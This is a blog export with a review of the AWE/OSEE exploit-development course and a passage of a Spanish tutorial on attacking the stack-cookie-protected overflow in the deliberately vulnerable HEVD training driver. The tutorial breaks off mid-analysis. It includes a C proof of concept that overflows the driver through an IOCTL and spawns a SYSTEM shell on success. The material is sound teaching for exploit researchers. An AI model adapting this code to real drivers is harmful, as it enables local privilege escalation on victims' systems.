
[{"content":"","date":"18 August 2025","externalUrl":null,"permalink":"/","section":"","summary":"","title":"","type":"page"},{"content":"I recently obtained the Offensive Security Exploitation Expert (OSEE) certification and wanted to write a review on both the exam and the Advanced Windows Exploitation (AWE/EXP-401) course itself. Perhaps even more importantly I wanted to write about my key takeaways. If you\u0026rsquo;re just interested in preparing yourself for this course, I have released all my prep resources which can be found on my GitHub repository AWE-PREP. However, this review will provide context as to why I selected these resources for prep.\nIn this review I will be talking about multiple courses not just those created by Offensive Security. It’s imperative that you see the full picture of the journey since it is not linear and frankly everyone’s journey is different. More than likely my path will differ from yours.\nLet\u0026rsquo;s kick things off…\nTable of Contents # Going To London Course Overview (2024) Milking the Course The Consequences Of My Own Actions Course Timelines My Approach Exam Take 1 Take 2 Exam Advice Ramblings of a Madman My Path to OSEE Recommended Path Ain\u0026rsquo;t No Rest for the Wicked Going To London # AWE is offered at multiple locations such as Black Hat USA. However, I had been trying to take this course since 2019 so I wanted to pick a date that allowed me to prep sufficiently. The date that made the most sense for me would take place in London. If you get a seat, before you arrive you will get a series of emails containing links to publications that can help you get familiar with some of the information that will be covered in the course.\nMy first email containing this information was 11 days before the start date and the links provided contained information you should already be familiar with (in my opinion).\nPerhaps more importantly, you get a list of hardware requirements to be able to participate in the training itself. Since this is a bleeding edge course, I imagine that these hardware requirements will change over time but stay relatively the same.\nI would advise against bringing anything that uses an ARM processor!\nAbout three days later I received another email containing more articles. This time you may see material you are not familiar with - my advice is to read what you feel will be necessary to understand a broad set of subjects, but don\u0026rsquo;t overwhelm yourself. It\u0026rsquo;s easy to get \u0026ldquo;fear\u0026rdquo; from reading these articles thinking AWE will be worse. The reality is that these articles may not go into as many details as Offsec will, so consume the material understanding you may not fully understand it\u0026hellip; yet.\nCourse Overview (2024) # I took this course in 2024, this is important to mention since this course is constantly updated. As of 2025 the course material has already changed but for the sake of this review the following material was covered when I took the AWE:\nCustom Shellcode Creation VMWare Workstation Guest-To-Host Escape Microsoft Edge Type Confusion Driver Callback Overwrite Unsanitized User-mode Callback This is a very high-level overview of the material covered but ultimately there\u0026rsquo;s a lot that goes into each of these five categories. Expect to learn how to bypass most modern exploit mitigations such ASLR, DEP, CFG, ACG, CET, and even exploit mitigations that are optionally enabled.\nSince this course updates so frequently I will avoid talking about anything specific to these sections.\nMilking the Course # Before starting the course, I had already completed RET2 System Wargames and HackSys Extreme Vulnerable Driver (HEVD) so a good amount of the information was fairly easy to digest. Of course, there were things I did not know or fully understand at the time but ultimately the confidence I gained from these two prep resources made me significantly less intimidated. I mention this to emphasize that knowing C and Assembly will take you further than learning techniques. In fact, the \u0026ldquo;Violet Phosphorus\u0026rdquo; technique I developed I did so with just research on how kernel Page Table Entries (PTE\u0026rsquo;s) work. Offsec bypasses SMEP using a different technique within the course.\nThat said, if you follow this path, you will likely feel just as confident. However, don\u0026rsquo;t be fooled by this feeling, the course requires your attention and to get the most out of it DO NOT FOCUS ON ANY OF THE EXTRA MILES UNTIL AFTER THE DAYS TRAINING HAS ENDED.\nIf we do some quick math, assuming the course is 10k, you are paying 2k per day. If you work on any extra miles during the training like I did, you will literally be missing out on 2k\u0026hellip; Thankfully I was not the only one who did this or I would feel even worse than I did - the motivation was a challenge coin which in the end I did not even get\u0026hellip; Funny enough If I would have paid attention on one of the training days, I would have learned what was needed to get a coin. So, pay attention!!! You are there to learn!!\nIn addition to losing out on learning techniques for a coin, I missed out on learning information that would have resulted in questions. When you get home, you\u0026rsquo;ll see not everything is explained thoroughly and you\u0026rsquo;ll need to fill in the gaps. If I had paid attention during the training I could have asked these questions in person.\nThe Consequences Of My Own Actions # When I got back from London, I realized that I pretty much ignored half of what was presented during the course. Learn from my mistakes!\nSadly, around this time I also entered a new role as a Security Researcher in which I would be utilizing ARM/AARCH64 more than x64. This meant I would need to juggle 3 architectures and multiple languages (Java, Python, C, C++, etc). A few months after this I would also have my Arsenal Talk be accepted for Black Hat USA 2025 - so I needed to work on my tool Sickle as well.\nClearly, I had my hands full, but I wanted to get the OSEE so if I wanted to transition into a Windows Reverse Engineering role or work as a Windows Kernel Exploit Developer, I would have the knowledge needed to get past any hurdles that come with the interview process. Since in my experience, I can (like many others) figure anything out with enough time. However, should I fail an interview task, the OSEE will be a good indicator to employers of how hard I\u0026rsquo;m willing to work on complex tasks.\nThis meant I had to work on this whenever possible and could not be as heads down as I would be on a course relevant to my position. Really thinking about it though, everyone is constantly doing stuff, so even though you may not be in the exact same boat you\u0026rsquo;re likely in a similar situation (family, friends, wife, kids, work, etc). That said I documented exactly how much time it took me to complete the course on my own from start to finish.\nCourse Timelines # Below is a table of how I progressed through the course from start to finish. It\u0026rsquo;s important to note I treated the course as if I were taking the exam - this meant everywhere IDA was used Ghidra was used instead! This likely added a significant amount of time but I truly believe it was worth the time investment.\nSection Time Taken To Complete Custom Shellcode Creation 8 hours, 20min VMWare Workstation Guest-To-Host Escape 73 hours, 48min Microsoft Edge Type Confusion 80 hours, 25min Driver Callback Overwrite 65 hours, 22min Unsanitized User-mode Callback 46 hours, 34min Based on the table shown above, the course alone took me about 274 hours to complete from start to finish with a \u0026ldquo;generic\u0026rdquo; understanding of the subject matter. Unfortunately, at the time of passing the OSEE I did not finish all the extra miles.\nI did however document how long they took me! Below is the table of extra mile timelines per section:\nSection Time Taken To Complete Custom Shellcode Creation No Extra Miles VMWare Workstation Guest-To-Host Escape 35 hours, 41min Microsoft Edge Type Confusion 51 hours, 52min Driver Callback Overwrite 28 hours 2min Unsanitized User-mode Callback N/A This meant it took me a total of about 115 hours. So, let\u0026rsquo;s say total time before the exam spent on the AWE was about 389 hours. If I did not have as many distractions I absolutely would have invested more time in the overall subject matter.\nMy Approach # When approaching any course my objective is to learn not get a certification. If you follow this sentiment, my advice is to complete the course section and generate a list of questions for yourself. Since the AWE is constantly evolving, I won\u0026rsquo;t include all my generated questions but below are a few.\nDescription Complete Offsec used X to implement Y. Can we implement Y without the use of X? [\u0026#x2714;\u0026#xfe0f;] Offsec used X to bypass Y when exploiting Z. Write a standalone PoC to exploit this outside of Z, if the PoC works write a function to abuse this, so that it can be integrated into future exploits. [\u0026#x2714;\u0026#xfe0f;] Create a diagram showing a high-level overview of Z exploit, ensure you understand each part of the exploitation process. [\u0026#x2714;\u0026#xfe0f;] On page X Offsec traversed Y, ensure you understand why. [\u0026#x2714;\u0026#xfe0f;] In addition to this go the extra mile on challenges that are not necessarily an \u0026ldquo;extra mile\u0026rdquo;. As a high-level example, if you are given the challenge:\nChallenge: Write a for loop Don\u0026rsquo;t write:\nfor (int i = 0; i \u0026lt; 5; i++) { printf(\u0026#34;hi\\n\u0026#34;); } Instead, write something that needs a loop. This way you learn the concept but more importantly you learn how and when to use it. Because I study this way, there were times within the AWE I completed an extra mile BEFORE I knew it was going to be one. I believe this helped me understand the subject matter more than someone who only did the challenges as presented to them.\nThat said I did not complete all the extra miles, mainly due to the fact I was also working with ARM in parallel (taking additional training). If you can, I heavily recommend completing all extra miles!\nExam # I sadly cannot reveal too much on the exam itself, but I can say that it is rather \u0026ldquo;fair\u0026rdquo; in terms of the challenges. Having worked as an Exploit Developer / Security Researcher it was very similar to a task you may be given on the job. That said, they don\u0026rsquo;t expect you to take the 0day angle - that\u0026rsquo;s all I\u0026rsquo;ll say in terms of the actual content the exam consists of.\nUnfortunately for me, I had not touched WinDbg for weeks prior to the exam (GDB had me pinned down and AARCH64 was right next to him kicking me). So, the night before I gave myself a quick refresher and got re-acquainted with where everything I had written was (tooling).\nOverall, despite this I still felt confident in my abilities to get the OSEE.\nTake 1 # So, the day of the exam had arrived and after reading the questions I still felt like I could do this. However, the biggest mistake I made in the first 16ish hours was jumping back and forth between the challenges - my advice to you is to take your time on one challenge at a time.\nSadly, in the end I did not automate one thing as effectively as I could have costing me the exam.\nTake 2 # My second attempt I pretty much got half the points needed to pass within a few hours (the proctor ended up thinking I was cheating lol). A few hours after that I had enough points to pass (but I did not know that).\nSo, I proceeded to waste (I\u0026rsquo;m willing to bet) 30 hours trying to make something I already had working \u0026ldquo;stronger\u0026rdquo;.\nEventually, I thought to myself \u0026ldquo;nahhhh I reverse engineered this entire thing\u0026hellip; this is not possible\u0026rdquo;. So, I asked the proctor a question about the challenge I was working on, and they came back and replied:\nNOT EXACT QOUTE: \u0026#34;We cannot answer questions in regard to the exam\u0026#34; So, I re-read the question and that response, then I thought to myself - \u0026ldquo;wow\u0026hellip; I had this in the first X hours\u0026rdquo;. I looked at the time and thought to myself, I hope this is enough to pass because I still need to write the report\u0026hellip;\nLuckily for me, this time I had survived the exam:\nExam Advice # Having passed, if I could talk to my past self this is the advice I would give:\nIf your exploit works in the lab but not the target - let it run\u0026hellip; the target environment may be slower If compilation fails and you are using a share, compile outside the share Automate the debugging process as much as possible (crash, launch, attach, etc) Do not re-use variable names even across functions (encountered weird issues) Don\u0026rsquo;t initialize variables you need for exploitation (encountered weird issues) e.g LPVOID thing = func(); is better than LPVOID thing = NULL; thing = func();. If exploitation is unreliable a simple Sleep() can make a huge difference Try not to error check, some functions return partial data and still trigger an error but that partial data could be all you need Do not use WinDbg preview unless you have no choice (have seen debugging functionalities not work) Process context matters, especially with breakpoints If the exploit worked fine but randomly stopped working revert the lab Use the same target language for compilation as you did during the course e.g don\u0026rsquo;t use C++11 when you have been compiling your code in C++17 Backup, backup, backup e.g if you make considerable progress copy the current exploit to a backup then continue working e.g if you write a function but found it to not be useful create a backup (may come in handy later) Take your time, if you don\u0026rsquo;t see something immediately make a judgment call on time usage and reverse engineer! READ THE CHALLENGES CAREFULLY Ramblings of a Madman # I first got introduced to binary exploitation like many others with a JMP ESP when learning about buffer overflows. More specifically, I did so using the Immunity Debugger within the now retired OSCP.\nNow I know what you\u0026rsquo;re thinking\u0026hellip; what the frick is an Immunity Debugger? For the sake of time, it\u0026rsquo;s just an x86 debugger developed by the now dead Immunity Inc (R.I.P). An image of it can be seen below.\nI mention this for multiple reasons but perhaps the most important being - technology is constantly evolving and true understanding is necessary to continue to evolve with it. At the time of writing a Buffer Overflow I had no idea what I was doing\u0026hellip; yet I still passed the exam since I learned the steps taken when exploiting this very specific flaw. Knowing these steps, I could exploit any buffer overflow assuming it had no memory protections and the right conditions\u0026hellip;\nYounger me being incredibly confident in my abilities (I was OSCP certified after all), was quickly humbled by a user on NetSecFocus (we\u0026rsquo;ll call him Jack) who was an actual reverse engineer not a penetration tester. In fact, if I remember correctly, he had NO CERTIFICATIONS just a love for mathematics.\nTo make a long story short after an argument with Jack over what occurs during the exploitation of a stack overflow I learned a few things:\nI could exploit a bug under very specific conditions I knew what steps were needed I didn\u0026rsquo;t know why or how this was possible I needed to know more\u0026hellip; so I made a goal for myself\u0026hellip; which looking back is ambitious for someone who didn\u0026rsquo;t even understand what the stack did\u0026hellip;\nI wanted to become an Exploit Developer.\nMy Path to OSEE # Before I dive deeper into my rant(s) below is a high-level overview of my accomplishments before getting the OSEE. Please keep in mind I have only included information relevant to this course, so I won\u0026rsquo;t be focusing on anything that I don\u0026rsquo;t believe is relevant to exploit development. The reason I want you to see this is so that you understand that depending on your goal you do not need the OSEE certification. This is not said to deter you from taking AWE either - in fact I believe that each time the course is updated you would benefit from retaking it (regardless of obtaining the OSEE) and I will explain why within this review.\nThe main takeaway from this roadmap is to take your time and not focus on achieving the OSEE. Instead focus on actually learning!\nDate Objective Return on Investment 2016 C The Absolute Beginners Guide - Exposure to a compiler - Exposure to fixing basic bugs 2017 OSCP - Introduction to debuggers - Introduction to stack overflows 2017 SecurityTube Linux Assembly Expert (SLAE) - Introduction to GDB - Better understanding of assembly 2017 Sickle - Mainly developed for formatting custom shellcode 2017 Corelan Exploitation Series - Finally understanding stack overflows - Introduction to SEH based exploits - Introduction to unicode exploits (SEH) - Introduction to egghunters - Introduction to shellcoding 2017 Vulnserver - Introduction to fuzzing (boofuzz) - Practicing SEH based vulnerability exploitation - Discovered 0day shorty after using new skills 2017 Cracking the Perimeter (CTP) / OSCE - Introduction to backdooring PE\u0026rsquo;s - Introduction to AV bypasses - Introduction to ASLR - Introduction shellcode magic (Aaron Adams) - Introduction to ASCII encoding 2019 Advanced Web Exploitation Expert (AWAE) / OSWE - Introduction to source code review - Exposure to multiple languages - Exposure to exploit primitives - Developing large complex exploits 2019 Corelan Advanced Exploit Development Training - Introduction to windows heap - Introduction to use-after-free vulnerabilities - Introduction to heap exploitation - Introduction to browser exploitation - Exposure to ROP 2019 0dayz (IBM) - Hit @midwestneil with a \u0026ldquo;trust me bro\u0026rdquo; for research time - First time using IDA Pro - First exposure to reverse engineering an x64 target - Reverse engineered the server, client, and protocol - Created a custom fuzzer (from scratch - boofuzz failed) - Discovered 2 RCE\u0026rsquo;s and 1 DoS - Exposure to responsible disclosure - No profit ( ㄕཀ ʖ̯ ཀ) 2020 Deeper dives into C - The C Programming Language - Effective C - Learn C++ 2020 SANS 760 - Exposure to IDA scripting - windows Internals Knowledge - ROP/JOP - ASLR - Canaries / Cookies - Overall I was humbled\u0026hellip; 2021 CodeMachine WINMAL Course - Programming using the windows API (C/C++) - Exposure to advanced malware techniques - Implant Development - Persistence - Process Injection - Evasion techniques 2021 Evasion Techniques and Breaching Defenses (PEN-300) - Programming using the windows api (C#, JS, VBS) - Process Injection Techniques - Antivirus Evasion 2021 Modern Binary Exploitation (MBE) - Learned reverse engineering tooling - Learned exploitation techniques - Learned about a few memory protections - Exposure to linux kernel exploitation 2021 Immunity Inc - Briefly worked as a Senior Exploit Developer - Humbled daily 2024 N/A - Briefly worked as a Principal Offensive Security Researcher 2024 The Ghidra Book: The Definitive Guide (to page 256) - Learned how Ghidra works (applicable to IDA / other tools) - Actually learned how to RE effectively 2024 RET2 Systems Wargames - Rehashed C fundementals and learned new things! - Understood vulnerabilties better since we see the C code\n- Exercised reverse engineering - Exposure to multiple memory protections - Exposure to unique flaws (not vanilla) - Utilized imaginitive ways to exploit complex challenges - My first exposure to race conditions (and I understood them!) 2024 Learn C++ - Learned C++ from an online platform - Gained a deeper appreciate for C 2024 HackSysVulnerableDriver (HEVD) - Practiced what I learned from RET2 in the kernel - Hit a roadblock and wrote Violet Phosphorus ROP chain - Learned my technique is a SMEP bypass NOT a VBS bypass 2024 Advanced Windows Exploitation (AWE) - Custom shellcode creation - Introduction to virtual machine escapes - Introduction to chakra internals - Exposure to default and non-default enabled mitigations - Driver vulnerability exploitation - Native callback vulnerability exploitation 2025 OSEE - Completed the exam Recommended Path # So clearly, I had the huge privilege of being able to afford some of these courses. This is because shortly after obtaining the OSCP and OSCE I was hired on by IBM as a Cloud Red Team Operator. I believe the SANS 760 was the first course I had the privilege of being sponsored, regardless you may be in a position where you fund your own training.\nSo where do I recommend you invest your time and money? Before answering, please keep in mind that I have never taken the Windows User Mode Exploit Development (EXP-301 / OSED) from Offsec since I previously took the now retired OSCE.\nAlthough EXP-301 covers newer material compared to that of the OSCE I learned most of what I know today from other sources. In my opinion, this further emphasizes why these certifications NEED to be for life. I believe every OSCP / OSCE student likely continues studying - they just may not necessarily study material on a syllabus.\nRegardless, in my experience reverse engineering and the thought process behind exploit development is more important than one platform (Windows or Linux). To focus on techniques (such as the Stack Overflow) will lead you down a path where you will always depend on others to develop your own hacks.\nCan you imagine finding a Stack Overflow before anyone knew it existed? This is only possible if you can know how systems works - like our friend Jack.\nShown below is my revised map.\nLet\u0026rsquo;s break this down.\nC/C++ If your goal is to become a Security Researcher or an Exploit Developer you must learn C. This is not negotiable, the lack of C programming will severely limit your ability to understand any system internals. Windows and Linux are primarily built on C! C is not a vulnerable language like many like to preach it is, the problem is many programmers do not know what they\u0026rsquo;re really doing which leads to bugs. SecurityTube Linux Assembly Expert (SLAE) I cannot emphasize this course enough, I believe there is a SLAE64 as well which covers x64 vs x86. If so, take SLAE64! Regardless, this is the best way to get comfortable looking at Assembly Language. I read a good portion of the book Assembly Language Step-By-Step Programming with Linux and I barely started coding in ASM after hundreds of pages\u0026hellip; Thankfully abatchy shared SLAE with me or it would have taken an eternity for me to learn assembly. RET2 System Wargames + Ghidra Book The Ghidra book really helped me level up my reverse engineering capabilities, and I got really comfortable with Ghidra. The best takeaway from the book has to be that the authors tell you how Ghidra can generate disassembly and pseudo code. This helped me develop a mindset on how to view assembly when reversing. Taking that knowledge to RET2 made everything click. This is because RET2 provides source code (sometimes), which allows you to really understand what is happening at a C level to then be able to map it to assembly. This is important because in real life sometimes pseudo code is wrong and you the reverse engineer must fix it! This is possible because you are debugging using their online interface (which operates just like GDB). Meaning you cannot escape assembly even with the C code. In addition to this RET2 starts from binaries with no memory protections all the way to Race Conditions with exploit mitigations enabled. As someone with some experience at the time, I actually did learn new things even on the \u0026ldquo;less secure\u0026rdquo; challenges. They are also the creators of MBE (which mainly covers x86)! Corelan Exploit Writing Tutorials (Free) If you\u0026rsquo;ve heard of Corelan you may know he is the author of mona.py. However, he does not rely on it when teaching you exploit development concepts, instead he teaches you how to find things manually. Once done, he introduces plugins and tools such as mona.py. To give you an idea when writing a ROP chain for an x86 exploit it may take you a couple hours, with mona.py it could be seconds\u0026hellip; This should tell you enough as to why you should learn from these tutorials - the best part - they\u0026rsquo;re free! You may see that he targets Windows XP but SEH exploits still affect modern versions of Windows to this day\u0026hellip; Just because the tutorial has not been maintained it does not mean it has lost its impact. Do not sleep on the free Corelan Tutorials\u0026hellip; Although I have not taken it he also offers updated training for the Windows Stack if you do want the latest knowledge he provides and can afford it. Basics of Windows Shellcode Writing This is yet another free resource. Although it is one blog post, I have yet to see another resource such as this for shellcode development in Windows. If you study this and make an effort to understand it, I believe you will have the ability to write Windows shellcode! This is an important skill to have since exploits sometimes require custom stubs. In addition to this, you may have a hard time learning this skill on the fly since it is not as easy to write as it would be in a Linux environment. For this reason I recommend learning shellcoding BEFORE enrolling in the AWE. Evasion Techniques and Breaching Defenses (PEN-300) Although I never achieved the OSEP, I cannot deny that the way Offsec covers navigating the Windows API is excellent. If you can learn how to write programs using the Windows API without this course you can skip the PEN-300. Although it does also cover some malware development which easily falls into the category of exploit development since you\u0026rsquo;re often working with API calls and memory management. CodeMachine WINMAL This course is far more advanced that PEN-300, if you don\u0026rsquo;t already know how to program using the Windows API you will find this to be hard to follow. Regardless the techniques CodeMachine teaches are extremely beneficial. In fact this is a course I will be taking again (in addition to other trainings) and it is a course that I would say is worth re-taking anytime it is updated. You get no certification for completing this course, this is purely for obtaining knowledge\u0026hellip; which is power. Corelan Heap Masterclass This course by Corelan is not free\u0026hellip; However the knowledge is truly priceless and I guarantee if you pay attention even a little bit, it will directly impact your career. Shorty after attending, using the knowledge I obtained I was able to exploit a 0day on an x64 target having NEVER touched the architecture. This is because the techniques Corelan teaches are applicable to any architecture! If you followed my map - by now you are likely able to fully digest the information he will be teaching. As much as I hate to say it, at the time I took it, much of the information went over my head. However, the information that didn\u0026rsquo;t directly aided me during a real engagement. This is again a course worth re-taking when updated. HackSysVulnerableDriver (HEVD) I and many others offer free tutorials on how to exploit the HEVD driver. This is a solid entry into driver / kernel exploitation. By now you should be familiar with the bug classes you are likely to encounter. The bugs that exist in userland also exist within kernel! By now this should be a walk in the park for you! SANS 760 This is an absolutely incredible course\u0026hellip; The amount of information that is valuable to the modern exploit developer cannot be emphasized enough. However, if you lack a significant amount of knowledge much of the information will go over your head. If you followed my map the information should now be easier to digest. This is another course I recommend taking every time there is an update. Advanced Windows Exploitation (AWE) You simply cannot get OSEE without taking the AWE. Even if you obtain the OSEE this is a course worth retaking when updated. The knowledge it provides would take you a considerable amount of time to obtain on your own. There\u0026rsquo;s techniques shown that if I went in blind, it would take me months if not years to learn. What you are paying for (the same applies to 760) in this course is the hard work of the course authors making incredibly complex subjects \u0026ldquo;simple\u0026rdquo;. So if you think learning these concepts is hard, imagine if you were on your own\u0026hellip; Although the goal as a researcher is to be independent, the truth is your favorite researcher likely depended on research from another researcher. A solid example of this is Violet Phosphorus, Offsec does not use this method to bypass SMEP, the way they do it - I would not have done myself (\u0026quot;different but same same\u0026quot;). The perspective they hold on how to approach modern mitigations is worth every penny and I imagine updates will include the latest methods. Since I have actually consumed these resources, these are my recommendations that I feel I can vouch for. If you ever get a recommendation from me I have either engaged in the course or read the book!\nNotably, we now live in the year 2025 where there\u0026rsquo;s a TON of free resources. So if you are unable to get into these courses my advice is to download the syllabus and google how to do everything mentioned within the syllabus. This is how I originally prepared for the OSCP and OSCE.\nAin\u0026rsquo;t No Rest for the Wicked # The truth is that when it comes to Offensive Security Operations, the studying never stops and in my experience working as a Red Team Operator, Exploit Developer, and Researcher a diverse set of skills is expected from you by your employer. So, you\u0026rsquo;ll need to be advanced in multiple subject matters depending on your role.\nThis is where the AWE, Corelan Advanced, WINMAL, and SANS 760 shine, because luckily once you learn C, Assembly Language, and Reverse Engineering when a new techniques comes out you will be able to learn it relatively fast. Sadly, these new techniques are rarely documented in a manor that you would learn quickly - this is why I have a massive respect for course authors.\nThe huge value I see from these courses is the ability to get the techniques you will use in the field in a manor faster than it would take if you did on your own. Not only this, but you will get hands on experience implementing them which is also valuable. Which should you take when updated? That really depends on your role and expectations\u0026hellip;\nRegardless, never stop studying! A certification is a byproduct of the knowledge gained throughout the journey!\n","date":"18 August 2025","externalUrl":null,"permalink":"/posts/advanced-windows-exploitation-review/","section":"Posts","summary":"","title":"Advanced Windows Exploitation (AWE) Review","type":"posts"},{"content":"","date":"18 August 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"En el último tutorial explotamos una de las clases de errores más notorias de toda la industria: las Condiciones de Carrera o también conocido como Race Conditions.\nEn este tutorial volveremos a una clase de error que hemos explotado antes - The Stack Overflow. Sin embargo, esta vez nos encontraremos con una mitigación de exploits conocida como stack cookies o canaries. Dicho esto, saltaremos Windows 7 (x86) y procederemos directamente a Windows 11 (x64).\nEs importante tener en cuenta que el problema central en relación con la vulnerabilidad de seguridad NO HA cambiado; seguiremos explotando un Stack Overflow.\nPasemos a una descripción general de alto nivel :)\nTable of Contents # Qué son Stack Cookies (Alto Nivel) Ingeniería Inversa Creando el PoC Análisis de la Mitigación Horneando galletas Explotación Recursos Qué son Stack Cookies (Alto Nivel) # Cookies son probablemente uno de los postres más populares; sin embargo, en el contexto de la seguridad cibernética, este es normalmente un término utilizado por los Exploit Developers en respecto a una mitigación de seguridad diseñada para evitar desbordamientos del búfer (también conocidos como stack overflows). Antes de entrar a los detalles técnicos, esto se entiende mejor con una descripción general de alto nivel.\nImagínese que acaba de ir a una excursión familiar y ha traído galletas con chispas de chocolate de la tienda para que otros las coman. Estas cookies son de CENSURADAS, y todos están listo a probarlas!\nSin embargo, tu tía lo pone claro: “todos deben cenar antes del postre”. No sabes que tu tía está celosa. Tus galletas se han convertido en la estrella de la cena! Como le avisaste horas antes de llegar que traerías estas galletas, ella cocinó un lote indistinguible de las galletas de CENSURADO.\nSin embargo, ha añadido un ingrediente\u0026hellip;\nMientras todos están distraídos cenando, tu tía cambia las galletas que trajiste por las de ella. Parece que su carne asada volverá a ser la estrella de la cena.\nUna vez que todos terminaron su comida, fueron a comer unas deliciosas galletas con chispas de chocolate. Sin embargo, parece que el plan de tu tía falló ya que todos probaron las pasas y CENSURADO no hace galletas con pasas!\nCómo se relaciona esto con las mitigaciones de explotación?\nEn este escenario, usted y su familia serían el stack/sistema operativo o Operating System (OS) y las cookies serían llas Stack Cookies (o canaries). Tu tía sería la atacante. El intercambio de cookies podría considerarse como el stack overflow Dado que estas cookies son únicas (chispas de chocolate), usted y su familia podrán identificar fácilmente que no pertenecen a CENSURADO. De manera muy similar, esto es lo que hace la mitigación de exploits.\nCuando explotas un stack overflow, estás corrompiendo la memoria, esto incluye variables, estructuras, etc. Con esta mitigación, se agrega una \u0026ldquo;cookie\u0026rdquo; o valor a el stack.\nLa forma en que funcionan los programas es que cuando una aplicación regresa de una llamada a una función y la ejecución se dirige a una dirección de retorno, la aplicación realizará una verificación para garantizar que la cookie (valor) no esté dañada (suponiendo que la mitigación esté habilitada). Si la aplicación o el sistema operativo detectan una modificación de este valor, el sistema operativo o la aplicación falla; sin embargo, no de una manera que beneficie al atacante.\nSi no podemos encontrar una manera de evitar que esto suceda (por ejemplo, utilizando un leak), lo más probable es que no podamos explotar esta vulnerabilidad.\nPor supuesto, hay muchas maneras de evitar cualquier mitigación y hoy haremos precisamente eso!\nQuizás ya estés pensando \u0026ldquo;y si nuestra tía usara chispas de chocolate y no pasas\u0026rdquo;?\nIngeniería Inversa # Al igual que con vulnerabilidades anteriores, necesitaremos recopilar información antes de iniciar la explotación: el código IOCTL (0x222007) y la función vulnerable. Esto es facil de encontrar ya que HEVD viene con símbolos y funciones convenientemente nombrados para que podamos aprender más sobre estas clases de errores.\nSegún la descompilación que se muestra arriba, no estaremos luchando con ninguna estructura personalizada, que significa que podemos proceder a mirar a la función TriggerBufferOverflowStackGS.\nAl observar la descompilación anterior, podemos ver que la cookie se almacena en la pseudo variable local_38, luego llamamos a __security_check_cookie() al salir de la función. En cuanto a la vulnerabilidad principal, sabemos que se trata de un desbordamiento del búfer básico basado en que memcpy() copia cualquier búfer en la variable de matriz de pseudocódigo local_238[]. Sigamos adelante y elaboremos una prueba de concepto para ver qué sucede cuando activamos esta vulnerabilidad.\nCreando el PoC # Dado que estamos lidiando con un desbordamiento de pila básico o stack overflow, no hay necesidad de complicar demasiado esto.\nPreparemos una prueba de concepto!\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #include \u0026lt;psapi.h\u0026gt; #include \u0026lt;ntdef.h\u0026gt; #include \u0026lt;winternl.h\u0026gt; #include \u0026lt;shlwapi.h\u0026gt; /* IOCTL */ #define STACK_OVERFLOW_GS_IOCTL 0x222007 /* Exploit Settings */ #define ALLOCATION_SIZE 0x1000 /* GetKernelModuleBase(): Function used to obtain kernel module address */ LPVOID GetKernelModuleBase(PCHAR pKernelModule) { char pcDriver[1024] = { 0 }; LPVOID lpvTargetDriver = NULL; LPVOID *lpvDrivers = NULL; DWORD dwCB = 0; DWORD dwDrivers = 0; DWORD i = 0; EnumDeviceDrivers(NULL, dwCB, \u0026amp;dwCB); if (dwCB \u0026lt;= 0) return NULL; lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID)); if (lpvDrivers == NULL) return NULL; if (EnumDeviceDrivers(lpvDrivers, dwCB, \u0026amp;dwCB)) { dwDrivers = dwCB / sizeof(LPVOID); for (i = 0; i \u0026lt; dwDrivers; i++) if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver))) if (StrStrA(pcDriver, pKernelModule) != NULL) lpvTargetDriver = lpvDrivers[i]; } free(lpvDrivers); return lpvTargetDriver; } /* CheckWin(): Simple function to check if we\u0026#39;re running as SYSTEM */ int CheckWin(VOID) { DWORD win = 0; DWORD dwLen = 0; CHAR *cUsername = NULL; GetUserNameA(NULL, \u0026amp;dwLen); if (dwLen \u0026gt; 0) { cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR)); } else { printf(\u0026#34;[-] Failed to allocate buffer for username check\\n\u0026#34;); return -1; } GetUserNameA(cUsername, \u0026amp;dwLen); win = strcmp(cUsername, \u0026#34;SYSTEM\u0026#34;); free(cUsername); return (win == 0) ? win : -1; } /* GenerateExploitBuffer(): Generate the buffer that will overwrite the return address and grant control over the instruction pointer. */ DWORD GenerateExploitBuffer(LPVOID lpvNt, LPVOID lpvBuffer) { size_t i = 0; uint64_t *payload = (uint64_t *)lpvBuffer; for (i = 0; i \u0026lt; ALLOCATION_SIZE; i += sizeof(uint64_t)) *payload++ = 0x41414141; return i; } /* Exploit(): Stack Overflow (GS) */ int Exploit(HANDLE hHEVD) { DWORD dwExploitBuffer = 0; DWORD dwBytesReturned = 0; LPVOID lpvMemoryAlloc = NULL; lpvMemoryAlloc = VirtualAlloc(NULL, ALLOCATION_SIZE, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE); if (lpvMemoryAlloc == NULL) { printf(\u0026#34;[*] Failed to create exploitation buffer\\n\u0026#34;); return -1; } dwExploitBuffer = GenerateExploitBuffer(NULL, lpvMemoryAlloc); printf(\u0026#34;[*] Exploit buffer size: %d\\n\u0026#34;, dwExploitBuffer); DeviceIoControl(hHEVD, STACK_OVERFLOW_GS_IOCTL, lpvMemoryAlloc, dwExploitBuffer, NULL, 0x00, \u0026amp;dwBytesReturned, NULL); return CheckWin(); } int main() { HANDLE hHEVD = NULL; hHEVD = CreateFileA(\u0026#34;\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\u0026#34;, (GENERIC_READ | GENERIC_WRITE), 0x00, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); if (hHEVD == NULL) { printf(\u0026#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver\\n\u0026#34;); return -1; } if (Exploit(hHEVD) == 0) { printf(\u0026#34;[*] Exploitation success!!! Enjoy de shell!!\\n\\n\u0026#34;); system(\u0026#34;cmd.exe\u0026#34;); } else { printf(\u0026#34;[-] Exploitation failed, run again\\n\u0026#34;); } if (hHEVD != INVALID_HANDLE_VALUE) { CloseHandle(hHEVD); } } Una vez enviado, tenemos un choque :)\nSin embargo, al observar más el choque, podemos ver que hemos enfrentado la mitigación de cookies o canary del stack.\nAnálisis de la Mitigación # Al observar la inicialización de la cookie, podemos ver que la __security_cookie está almacenada dentro de HEVD en HEVD+0x3000 (también podemos confirmar esto en Ghidra). Además, podemos ver que la __security_cookie será sometida a XOR por el valor actualmente almacenado en RSP. Una vez completada, el resultado de la operación XOR se almacena en RSP+0x220, esencialmente un desplazamiento del stack. Sin profundizar más en esto, podemos suponer que si sobrescribimos 